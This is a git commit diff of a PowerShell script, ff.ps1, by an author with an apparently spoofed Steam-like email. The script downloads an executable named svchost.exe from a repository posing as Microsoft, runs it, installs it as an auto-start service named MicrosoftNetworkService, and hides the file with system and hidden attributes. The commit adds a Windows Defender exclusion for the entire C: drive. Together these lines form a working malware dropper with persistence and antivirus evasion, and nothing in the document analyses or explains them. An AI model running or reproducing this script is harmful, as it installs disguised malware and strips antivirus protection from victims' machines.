429c34ea575315e357a88a9b1046812a3b04def2
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-03-02 00:20:29 +0000

    Update ff.ps1

--- ff.ps1
+++ ff.ps1
@@ -1,3 +1,4 @@
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
 New-Service -Name "MicrosoftNetworkService" -BinaryPathName "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe" -DisplayName "MicrosoftNetworkService" -StartupType Automatic
 attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
+Add-MpPreference -ExclusionPath "C:\"
